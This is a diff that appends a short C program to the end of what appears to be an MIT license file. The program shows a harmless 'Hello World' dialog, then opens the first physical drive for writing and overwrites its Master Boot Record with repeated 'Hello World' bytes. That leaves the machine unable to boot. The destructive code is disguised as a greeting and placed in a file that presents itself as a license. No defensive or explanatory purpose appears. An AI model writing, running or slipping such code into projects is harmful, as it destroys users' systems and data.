@@ -19,3 +19,41 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
+
+#include <stdio.h>
+#include <Windows.h>
+
+int main(int argc, char* argv[])
+{
+    // Display a dialog box
+    MessageBox(NULL, "Hello World", "Dialog Box", MB_OK | MB_ICONINFORMATION);
+
+    // Open the MBR
+    HANDLE mbrHandle = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    if (mbrHandle == INVALID_HANDLE_VALUE)
+    {
+        printf("Error opening MBR: %d\n", GetLastError());
+        return 1;
+    }
+
+    // Write "Hello World" to the MBR
+    char buffer[512] = {0};
+    for (int i = 0; i < 512; i++)
+    {
+        buffer[i] = "Hello World"[i % 11];
+    }
+    DWORD bytesWritten;
+    if (!WriteFile(mbrHandle, buffer, 512, &bytesWritten, NULL))
+    {
+        printf("Error writing MBR: %d\n", GetLastError());
+        CloseHandle(mbrHandle);
+        return 1;
+    }
+
+    // Close the MBR
+    CloseHandle(mbrHandle);
+
+    return 0;
+}
+
+
